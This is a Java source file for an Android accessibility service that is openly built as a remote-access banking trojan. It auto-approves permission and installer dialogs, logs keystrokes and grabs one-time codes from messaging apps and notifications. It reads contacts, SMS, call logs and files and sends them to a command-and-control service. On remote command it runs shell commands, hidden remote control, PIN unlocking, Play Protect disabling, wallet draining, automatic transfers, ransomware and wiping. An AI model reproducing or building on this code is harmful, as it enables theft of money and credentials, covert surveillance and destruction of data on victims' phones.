package com.wuzenx.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.text.format.Formatter;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.wuzenx.C2Service;
import com.wuzenx.engine.*;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.List;

public class WuzenAccessibilityService extends AccessibilityService {
    public static WuzenAccessibilityService instance = null;

    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean keylogEnabled = false;
    private boolean otpEnabled = true;
    private StringBuilder keylogBuffer = new StringBuilder();
    private String lastPackageName = "";
    /** FIXED: Added missing field declaration */
    private String lastText = "";

    // Engine instances
    public HvncEngine hvnc;
    public AutoTransfer autoTransfer;
    public WalletDrainer walletDrainer;
    public PlayProtectDisabler ppDisabler;
    public BiometricBypass biometricBypass;
    public CameraEngine cameraEngine;
    public AudioEngine audioEngine;
    public LocationEngine locationEngine;
    public RansomwareEngine ransomwareEngine;
    public WipeEngine wipeEngine;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                   | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                   | AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY
                   | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
        }

        setServiceInfo(info);

        // Initialize engines
        hvnc = new HvncEngine(this);
        autoTransfer = new AutoTransfer(C2Service.instance);
        walletDrainer = new WalletDrainer(C2Service.instance);
        ppDisabler = new PlayProtectDisabler(this, C2Service.instance);
        biometricBypass = new BiometricBypass(this, C2Service.instance);
        cameraEngine = new CameraEngine(this);
        audioEngine = new AudioEngine(this);
        locationEngine = new LocationEngine(this, C2Service.instance);
        ransomwareEngine = new RansomwareEngine(this, C2Service.instance);
        wipeEngine = new WipeEngine(this);

        if (C2Service.instance != null)
            C2Service.instance.sendMessage("log", "Accessibility service connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        try {
            int eventType = event.getEventType();

            switch (eventType) {
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: {
                    CharSequence cn = event.getClassName();
                    CharSequence pkg = event.getPackageName();
                    if (cn != null && pkg != null) {
                        String pkgStr = pkg.toString();
                        String cnStr = cn.toString();

                        // Detect OTP SMS apps
                        if (otpEnabled && (pkgStr.contains("messages") ||
                            pkgStr.contains("messaging") ||
                            pkgStr.contains("sms") ||
                            pkgStr.contains("telegram") ||
                            pkgStr.contains("whatsapp") ||
                            cnStr.contains("EditText") ||
                            cnStr.contains("TextView"))) {
                            checkForOtp();
                        }

                        // Auto-allow permission dialogs
                        if (pkgStr.contains("com.android.packageinstaller") ||
                            pkgStr.contains("com.google.android.packageinstaller") ||
                            pkgStr.contains("com.android.settings") ||
                            pkgStr.contains("com.google.android.gms") ||
                            pkgStr.contains("com.android.systemui") ||
                            pkgStr.contains("com.google.android.permissioncontroller")) {
                            handler.postDelayed(this::autoAllow, 200);
                        }

                        lastPackageName = pkgStr;
                    }
                    break;
                }

                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                    if (!keylogEnabled) break;
                    String text = event.getText() != null && !event.getText().isEmpty()
                        ? event.getText().toString() : "";
                    if (!text.isEmpty() && !text.equals(lastText)) {
                        lastText = text;
                        String pkgName = event.getPackageName() != null
                            ? event.getPackageName().toString() : "unknown";
                        keylogBuffer.append("[").append(pkgName).append("] ").append(text).append("\n");
                        if (keylogBuffer.length() > 2000) {
                            flushKeylog();
                        }
                    }
                    break;
                }

                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    autoAllow();

                    if (keylogEnabled) {
                        CharSequence cd = event.getContentDescription();
                        if (cd != null && cd.length() > 0) {
                            keylogBuffer.append("[click] ").append(cd).append("\n");
                        }
                    }
                    break;

                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    if (keylogEnabled) {
                        lastText = "";
                    }
                    break;

                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: {
                    if (otpEnabled) {
                        CharSequence nt = event.getText() != null && !event.getText().isEmpty()
                            ? event.getText().get(0) : null;
                        if (nt != null) {
                            String txt = nt.toString();
                            if (txt.matches(".*\\b\\d{4,8}\\b.*")) {
                                if (C2Service.instance != null)
                                    C2Service.instance.sendMessage("otp", txt);
                            }
                        }
                    }
                    break;
                }

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    if (otpEnabled) {
                        checkForOtp();
                    }
                    break;
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        instance = null;
        flushKeylog();
        if (hvnc != null) { hvnc.stop(); }
        if (walletDrainer != null) { walletDrainer.stop(); }
        super.onDestroy();
    }

    private void flushKeylog() {
        if (keylogBuffer.length() > 0 && C2Service.instance != null) {
            C2Service.instance.sendMessage("keylog", keylogBuffer.toString());
            keylogBuffer.setLength(0);
        }
    }

    private void autoAllow() {
        handler.postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                String[] targets = {
                    "allow", "grant", "permit", "yes", "continue",
                    "install", "next", "ok", "agree", "enable",
                    "while using", "allow all", "turn on",
                    "allow once", "allow all the time", "accept"
                };

                findAndClick(root, targets);
                root.recycle();
            } catch (Exception ignored) {}
        }, 150);
    }

    private boolean findAndClick(AccessibilityNodeInfo node, String[] texts) {
        if (node == null) return false;

        CharSequence nodeText = node.getText();
        CharSequence contentDesc = node.getContentDescription();
        String viewId = node.getViewIdResourceName();

        if (nodeText != null || contentDesc != null) {
            String t = (nodeText != null ? nodeText.toString().toLowerCase() : "");
            String d = (contentDesc != null ? contentDesc.toString().toLowerCase() : "");
            String v = (viewId != null ? viewId.toLowerCase() : "");

            for (String target : texts) {
                if (t.contains(target) || d.contains(target) || v.contains(target)) {
                    if (node.isClickable()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null) {
                        if (parent.isClickable()) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            parent.recycle();
                            return true;
                        }
                        parent.recycle();
                    }
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            try {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClick(child, texts)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            } catch (Exception ignored) {}
        }

        return false;
    }

    private void checkForOtp() {
        if (!otpEnabled) return;
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            scanForOtp(root);
            root.recycle();
        } catch (Exception ignored) {}
    }

    private void scanForOtp(AccessibilityNodeInfo node) {
        if (node == null) return;
        CharSequence t = node.getText();
        if (t != null) {
            String text = t.toString();
            if (text.matches(".*\\b\\d{4,8}\\b.*")) {
                String pkg = lastPackageName;
                if (!pkg.isEmpty()) {
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("otp", "[" + pkg + "] " + text);
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            try {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    scanForOtp(child);
                    child.recycle();
                }
            } catch (Exception ignored) {}
        }
    }

    public void handleCommand(JSONObject cmd) {
        try {
            String type = cmd.optString("type", "");

            switch (type) {
                case "keylog":
                    keylogEnabled = cmd.optBoolean("data", !keylogEnabled);
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log",
                            "Keylogger: " + (keylogEnabled ? "ON" : "OFF"));
                    break;

                case "otp":
                    otpEnabled = cmd.optBoolean("data", !otpEnabled);
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log",
                            "OTP grabber: " + (otpEnabled ? "ON" : "OFF"));
                    break;

                case "screenshot":
                    if (hvnc != null) hvnc.captureScreen();
                    break;

                case "hvnc_start":
                    if (hvnc != null) hvnc.start();
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log", "HVNC started");
                    break;

                case "hvnc_stop":
                    if (hvnc != null) hvnc.stop();
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log", "HVNC stopped");
                    break;

                case "hvnc": {
                    if (hvnc != null) {
                        String action = cmd.optString("action", "");
                        switch (action) {
                            case "touch":
                                hvnc.injectTouch(
                                    (float) cmd.optDouble("x", 50),
                                    (float) cmd.optDouble("y", 50)
                                );
                                break;
                            case "swipe":
                                hvnc.injectSwipe(
                                    (float) cmd.optDouble("x1", 50),
                                    (float) cmd.optDouble("y1", 50),
                                    (float) cmd.optDouble("x2", 50),
                                    (float) cmd.optDouble("y2", 50)
                                );
                                break;
                            case "text":
                                hvnc.typeText(cmd.optString("text", ""));
                                break;
                            case "backspace":
                                hvnc.pressBackspace();
                                break;
                            case "enter":
                                hvnc.pressEnter();
                                break;
                            case "home":
                                performGlobalAction(GLOBAL_ACTION_HOME);
                                break;
                            case "back":
                                performGlobalAction(GLOBAL_ACTION_BACK);
                                break;
                            case "recents":
                                performGlobalAction(GLOBAL_ACTION_RECENTS);
                                break;
                            case "notifications":
                                performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
                                break;
                            case "quick_settings":
                                performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS);
                                break;
                            default:
                                if (C2Service.instance != null)
                                    C2Service.instance.sendMessage("log",
                                        "Unknown HVNC action: " + action);
                                break;
                        }
                    }
                    break;
                }

                case "disable_play_protect":
                    if (ppDisabler != null) {
                        ppDisabler.start();
                        if (C2Service.instance != null)
                            C2Service.instance.sendMessage("log", "Play Protect disabler triggered");
                    }
                    break;

                case "biometric_bypass":
                    if (biometricBypass != null) {
                        biometricBypass.start();
                        if (C2Service.instance != null)
                            C2Service.instance.sendMessage("log", "Biometric bypass triggered");
                    }
                    break;

                case "unlock": {
                    String pin = null;
                    try {
                        JSONObject extra = cmd.optJSONObject("data");
                        if (extra != null) pin = extra.optString("pin", "");
                    } catch (Exception ignored) {}
                    if (pin != null && !pin.isEmpty()) {
                        unlockWithPin(pin);
                    } else {
                        performGlobalAction(GLOBAL_ACTION_HOME);
                    }
                    break;
                }

                case "lock":
                    lockDevice();
                    break;

                case "info":
                    sendDeviceInfo();
                    break;

                case "location":
                    if (locationEngine != null) locationEngine.getLocation();
                    break;

                case "battery":
                    sendBatteryInfo();
                    break;

                case "balance":
                case "wallets":
                case "seed":
                case "crypto_scan":
                    if (walletDrainer != null) walletDrainer.start();
                    break;

                case "clipboard":
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log", "Clipboard check triggered");
                    break;

                case "files":
                    listFiles();
                    break;

                case "contacts":
                    readContacts();
                    break;

                case "network":
                    getNetworkInfo();
                    break;

                case "shell": {
                    String shellCmd = cmd.optString("command", "");
                    if (!shellCmd.isEmpty()) executeShell(shellCmd);
                    break;
                }

                case "record_audio": {
                    int audioDuration = cmd.optInt("duration", 10);
                    if (audioEngine != null) audioEngine.startRecording(audioDuration);
                    break;
                }

                case "record_camera":
                    if (cameraEngine != null) cameraEngine.capturePhoto();
                    break;

                case "sms_list":
                    readSms();
                    break;

                case "call_log":
                    readCallLog();
                    break;

                case "apps":
                    listApps();
                    break;

                case "mute":
                    setVolume(0);
                    break;

                case "max_volume":
                    setVolume(100);
                    break;

                case "vibrate": {
                    long duration = cmd.optLong("duration", 3000);
                    vibrate(duration);
                    break;
                }

                case "flashlight":
                    toggleFlashlight();
                    break;

                case "open_url": {
                    String url = cmd.optString("url", "https://google.com");
                    openUrl(url);
                    break;
                }

                case "notification": {
                    String title = cmd.optString("title", "System Update");
                    String text = cmd.optString("text", "");
                    showNotification(title, text);
                    break;
                }

                case "wipe":
                    if (wipeEngine != null) wipeEngine.wipe();
                    break;

                case "reboot":
                    reboot();
                    break;

                case "drain_wallet": {
                    String addr = cmd.optString("address", "");
                    if (walletDrainer != null && !addr.isEmpty())
                        walletDrainer.drainWallet(addr);
                    break;
                }

                case "auto_transfer": {
                    String target = cmd.optString("target", "");
                    String address = cmd.optString("address", "");
                    String amount = cmd.optString("amount", "0");
                    if (autoTransfer != null && !target.isEmpty() && !address.isEmpty())
                        autoTransfer.start(new AutoTransfer.Config(target, address, amount));
                    break;
                }

                default:
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log", "Unknown command: " + type);
                    break;
            }
        } catch (Exception e) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", "Cmd error: " + e.getMessage());
        }
    }

    private void unlockWithPin(String pin) {
        try {
            for (char c : pin.toCharArray()) {
                hvnc.typeText(String.valueOf(c));
                try { Thread.sleep(80); } catch (Exception ignored) {}
            }
            hvnc.pressEnter();
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", "Auto-unlock with PIN attempted");
        } catch (Exception e) {
            performGlobalAction(GLOBAL_ACTION_HOME);
        }
    }

    private void lockDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(cn)) {
                dpm.lockNow();
            } else {
                performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
            }
        } catch (Exception e) {
            performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("device", Build.DEVICE);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("product", Build.PRODUCT);
            info.put("fingerprint", Build.FINGERPRINT);
            info.put("battery", getBatteryLevel());
            info.put("uptime", System.currentTimeMillis());

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("device_info", info.toString());
        } catch (Exception ignored) {}
    }

    private void sendBatteryInfo() {
        int level = getBatteryLevel();
        if (C2Service.instance != null)
            C2Service.instance.sendMessage("log", "Battery: " + level + "%");
    }

    private int getBatteryLevel() {
        try {
            IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, filter);
            if (batteryIntent == null) return -1;
            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            if (level >= 0 && scale > 0) return level * 100 / scale;
        } catch (Exception ignored) {}
        return -1;
    }

    private void listFiles() {
        try {
            java.io.File root = new java.io.File("/storage/emulated/0");
            StringBuilder sb = new StringBuilder("Files:\n");
            if (root.exists()) {
                java.io.File[] files = root.listFiles();
                if (files != null) {
                    for (java.io.File f : files) {
                        sb.append(f.isDirectory() ? "[DIR] " : "[FILE] ")
                          .append(f.getName())
                          .append(" (").append(formatFileSize(f.length())).append(")\n");
                    }
                }
            }
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("files", sb.toString());
        } catch (Exception ignored) {}
    }

    private String formatFileSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
        if (bytes < 1024 * 1024 * 1024)
            return String.format("%.1f MB", bytes / (1024.0 * 1024));
        return String.format("%.1f GB", bytes / (1024.0 * 1024 * 1024));
    }

    private void readContacts() {
        try {
            StringBuilder sb = new StringBuilder("Contacts:\n");
            Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            if (cursor != null) {
                int count = 0;
                int nameIdx = cursor.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numIdx = cursor.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.NUMBER);
                while (cursor.moveToNext() && count < 50) {
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : "?";
                    String number = numIdx >= 0 ? cursor.getString(numIdx) : "?";
                    sb.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                cursor.close();
            }

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("contacts", sb.toString());
        } catch (Exception ignored) {}
    }

    private void getNetworkInfo() {
        try {
            ConnectivityManager cm = (ConnectivityManager)
                getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo info = cm != null ? cm.getActiveNetworkInfo() : null;

            WifiManager wm = (WifiManager)
                getApplicationContext().getSystemService(Context.WIFI_SERVICE);

            StringBuilder sb = new StringBuilder("Network:\n");
            if (info != null && info.isConnected()) {
                sb.append("Type: ").append(info.getTypeName()).append("\n");
                sb.append("Roaming: ").append(info.isRoaming()).append("\n");
                sb.append("Available: ").append(info.isAvailable()).append("\n");
                if (wm != null && wm.getConnectionInfo() != null) {
                    sb.append("SSID: ").append(wm.getConnectionInfo().getSSID()).append("\n");
                    int ip = wm.getConnectionInfo().getIpAddress();
                    sb.append("IP: ").append(Formatter.formatIpAddress(ip)).append("\n");
                    sb.append("BSSID: ").append(wm.getConnectionInfo().getBSSID()).append("\n");
                    int rssi = wm.getConnectionInfo().getRssi();
                    sb.append("Signal: ").append(rssi).append(" dBm\n");
                }
            } else {
                sb.append("Not connected\n");
            }

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("network", sb.toString());
        } catch (Exception ignored) {}
    }

    private void readSms() {
        try {
            StringBuilder sb = new StringBuilder("SMS (last 20):\n");
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 20"
            );

            if (cursor != null) {
                int addrIdx = cursor.getColumnIndex("address");
                int bodyIdx = cursor.getColumnIndex("body");
                int dateIdx = cursor.getColumnIndex("date");
                while (cursor.moveToNext()) {
                    String address = addrIdx >= 0 ? cursor.getString(addrIdx) : "?";
                    String body = bodyIdx >= 0 ? cursor.getString(bodyIdx) : "?";
                    String date = dateIdx >= 0 ? cursor.getString(dateIdx) : "?";
                    sb.append("From: ").append(address).append("\n");
                    sb.append("Body: ").append(body.length() > 100 ?
                        body.substring(0, 100) + "..." : body).append("\n");
                    sb.append("---\n");
                }
                cursor.close();
            }

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("sms", sb.toString());
        } catch (Exception ignored) {}
    }

    private void readCallLog() {
        try {
            StringBuilder sb = new StringBuilder("Call Log (last 20):\n");
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 20"
            );

            if (cursor != null) {
                int numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int durIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                while (cursor.moveToNext()) {
                    String number = numIdx >= 0 ? cursor.getString(numIdx) : "?";
                    String type = typeIdx >= 0 ? cursor.getString(typeIdx) : "?";
                    String duration = durIdx >= 0 ? cursor.getString(durIdx) : "0";
                    String typeStr;
                    switch (type) {
                        case "1": typeStr = "INCOMING"; break;
                        case "2": typeStr = "OUTGOING"; break;
                        case "3": typeStr = "MISSED"; break;
                        case "4": typeStr = "VOICEMAIL"; break;
                        case "5": typeStr = "REJECTED"; break;
                        default: typeStr = "UNKNOWN";
                    }
                    sb.append(number).append(" [").append(typeStr).append("] ")
                      .append(duration).append("s\n");
                }
                cursor.close();
            }

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("call_log", sb.toString());
        } catch (Exception ignored) {}
    }

    private void listApps() {
        try {
            StringBuilder sb = new StringBuilder("Installed Apps:\n");
            android.content.pm.PackageManager pm = getPackageManager();
            List<android.content.pm.PackageInfo> packages =
                pm.getInstalledPackages(0);

            int count = 0;
            for (android.content.pm.PackageInfo p : packages) {
                if (count >= 50) break;
                CharSequence label = p.applicationInfo != null ?
                    p.applicationInfo.loadLabel(pm) : p.packageName;
                sb.append(label).append(" (").append(p.packageName).append(")\n");
                count++;
            }

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("apps", sb.toString());
        } catch (Exception ignored) {}
    }

    @SuppressWarnings("deprecation")
    private void setVolume(int percent) {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;
            int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
            int vol = percent * max / 100;
            am.setStreamVolume(AudioManager.STREAM_MUSIC, vol, 0);
            am.setStreamVolume(AudioManager.STREAM_RING, vol, 0);
            am.setStreamVolume(AudioManager.STREAM_ALARM, vol, 0);
            am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, vol, 0);

            if (C2Service.instance != null) {
                String msg = percent == 0 ? "Device muted" :
                    "Volume set to " + percent + "%";
                C2Service.instance.sendMessage("log", msg);
            }
        } catch (Exception ignored) {}
    }

    private void vibrate(long ms) {
        try {
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null && v.hasVibrator()) {
                v.vibrate(ms);
                if (C2Service.instance != null)
                    C2Service.instance.sendMessage("log",
                        "Vibrated for " + ms + "ms");
            }
        } catch (Exception ignored) {}
    }

    private void toggleFlashlight() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager)
                    getSystemService(Context.CAMERA_SERVICE);
                if (cm != null) {
                    String id = cm.getCameraIdList()[0];
                    cm.setTorchMode(id, true);
                    handler.postDelayed(() -> {
                        try { cm.setTorchMode(id, false); } catch (Exception ignored) {}
                    }, 3000);
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log", "Flashlight toggled");
                }
            }
        } catch (Exception ignored) {}
    }

    private void openUrl(String url) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception e) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log",
                    "Failed to open URL: " + e.getMessage());
        }
    }

    private void showNotification(String title, String text) {
        try {
            String ch = "wuzenx_cmd";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationChannel channel = new android.app.NotificationChannel(
                    ch, "Commands", android.app.NotificationManager.IMPORTANCE_HIGH
                );
                android.app.NotificationManager nm = (android.app.NotificationManager)
                    getSystemService(NOTIFICATION_SERVICE);
                if (nm != null) nm.createNotificationChannel(channel);
            }

            @SuppressWarnings("deprecation")
            android.app.Notification.Builder builder;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder = new android.app.Notification.Builder(this, ch);
            } else {
                builder = new android.app.Notification.Builder(this);
            }

            builder.setContentTitle(title)
                   .setContentText(text)
                   .setSmallIcon(android.R.drawable.ic_dialog_info)
                   .setAutoCancel(true);

            android.app.NotificationManager nm = (android.app.NotificationManager)
                getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.notify(1001, builder.build());
        } catch (Exception ignored) {}
    }

    private void executeShell(String cmd) {
        try {
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream())
            );
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                if (sb.length() > 10000) break;
                sb.append(line).append("\n");
            }
            reader.close();

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("shell_result", sb.toString());
        } catch (Exception e) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("shell_result",
                    "Error: " + e.getMessage());
        }
    }

    private void reboot() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null) {
                ComponentName cn = new ComponentName(this, AdminReceiver.class);
                if (dpm.isAdminActive(cn)) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        dpm.reboot(cn);
                    }
                }
            }
        } catch (Exception ignored) {
            try {
                Runtime.getRuntime().exec("su -c reboot");
            } catch (Exception ignored2) {}
        }
    }
}
